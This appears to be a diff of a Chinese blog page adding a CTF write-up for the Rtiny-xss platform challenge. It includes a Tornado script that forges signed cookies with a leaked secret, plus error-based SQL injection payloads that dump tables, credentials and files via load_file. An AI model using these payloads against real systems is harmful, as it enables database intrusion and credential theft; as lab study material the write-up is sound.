@@ -91,6 +91,65 @@ if __name__ == "__main__":
 tornado.ioloop.IOLoop.instance().start()</code></pre>
 <p>运行脚本，访问127.0.0.1:8082/index，从cookie中得到username的值，一步步注入得到ichuqiu|318a61264482e503090facfc4337207f|545 MD5解密得密码Myxss623，登录后台点File，得到提示</p>
 <p>通过MYSQL函数 load_file读取，flag有点长要用mid()或者substr(),拼起来就行了</p>
+<h1 id="“百度杯”CTF比赛-九月场-XSS平台"><a href="#“百度杯”CTF比赛-九月场-XSS平台" class="headerlink" title="“百度杯”CTF比赛 九月场 XSS平台"></a>“百度杯”CTF比赛 九月场 XSS平台</h1><p>登录页面，开始时尝试注入，没有明显效果，无法判断是否存在注入。</p>
+<p>一时没了思路，看了大佬的 WP，发现大佬们是通过构造错误参数使得web报错，从而收集信息，算是又学习到了一招。</p>
+<p>于是，在burpsuite里面构造错误参数，报错得到信息</p>
+<p><img src="https://www.pianshen.com/images/701/4671cc330e1e0cf6446dfa638a58222d.png" alt="11129189-2438f0746cee3546.png"></p>
+<p>image</p>
+<p>报错信息中有一个rtiny</p>
+<p>在<a target="_blank" rel="noopener" href="https://github.com/r0ker/Rtiny-xss">github上找到相应 的项目</a></p>
+<p>于是下载源码，接下来，审计：</p>
+<p>在<code>rinty\lock.py</code>中有明显 的SQL注入漏洞，这里没有任何过滤。</p>
+<p><img src="https://www.pianshen.com/images/71/7e462daaefe6432a134846536834bcc7.png" alt="11129189-3966ee6e7920b948.png"></p>
+<p>image</p>
+<p>但是下面用到一个方法，<code>set_secure_cookie</code>，在<code>index.py</code>中发现用于加密cookie的<code>cookie_secret</code>的值，于是可以构造<code>secure_cookie</code></p>
+<p>所以我们只需要将自己的注入语句，使用相同的<code>cookie_secret</code>加密即可，脚本如下：</p>
+<pre><code># coding:utf-8
+import tornado.ioloop
+import tornado.web 
+settings = { 
+   "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",
+}
+class MainHandler(tornado.web.RequestHandler):
+    def get(self):
+        self.write("Hello")
+        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select version()))) -- ")
+        #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- ")
+        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- ")
+        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,mid((select group_concat(username,'|',password,'|',email) from manager),30,62))) -- ")
+       #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select load_file('/var/www/html/f13g_ls_here.txt'))))#")
+        self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),28,60)))#")
+        self.write(self.get_secure_cookie("username"))
+def make_app():
+    return tornado.web.Application([
+        (r"/index", MainHandler),
+        ], **settings)
+if __name__ == "__main__":
+    app = make_app()
+    app.listen(8089)
+    tornado.ioloop.IOLoop.instance().start()</code></pre>
+<p>带上cookie（username）访问lock ，查版本测试一下：</p>
+<p><img src="https://www.pianshen.com/images/262/47b409e395aaf1167db5a8f3d973023e.png" alt="11129189-718fffb67f014359.png"></p>
+<p>image</p>
+<p>查表名</p>
+<pre><code>' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- </code></pre>
+<p><img src="https://www.pianshen.com/images/218/787ebdfe8192e255861de6abb443d5c2.png" alt="11129189-35c01e3aa6c589c8.png"></p>
+<p>image</p>
+<p>查属性列名</p>
+<pre><code>' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- </code></pre>
+<p><img src="https://www.pianshen.com/images/789/267878078a2f241b36ca425a80d38bb5.png" alt="11129189-fd9af25dae3d0439.png"></p>
+<p>image</p>
+<p><img src="https://www.pianshen.com/images/63/b54bb500d23e6a0cf37bf9bf63b6dae7.png" alt="11129189-92983ee14280cbb0.png"></p>
+<p>image</p>
+<pre><code>ichuqiu|318a61264482e503090facfc4337207f|545
+md5解密得到账密：ichuqiu|Myxss623</code></pre>
+<p>登陆后台在File中看到提示：</p>
+<p><img src="https://www.pianshen.com/images/264/2c8aa30ac8f13a68c13c7feff9d8a340.png" alt="11129189-1be8a47d8800123b.png"></p>
+<p>image</p>
+<p>SQL注入来<code>load_file</code></p>
+<p><img src="https://www.pianshen.com/images/132/0e8c33f3cbb89db93e043655b17052cc.png" alt="11129189-9bd039e82fcc1233.png"></p>
+<p>image</p>
+<p>通过mid或者substr来读取完整的flag。</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
@@ -122,7 +181,7 @@ tornado.ioloop.IOLoop.instance().start()</code></pre>
     </div>
     
         <div class='side'>
-				
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA-XSS%E5%B9%B3%E5%8F%B0"><span class="toc-number">1.</span> <span class="toc-text">“百度杯”CTF比赛 九月场 XSS平台</span></a></li></ol>	
         </div>
     
 </div>
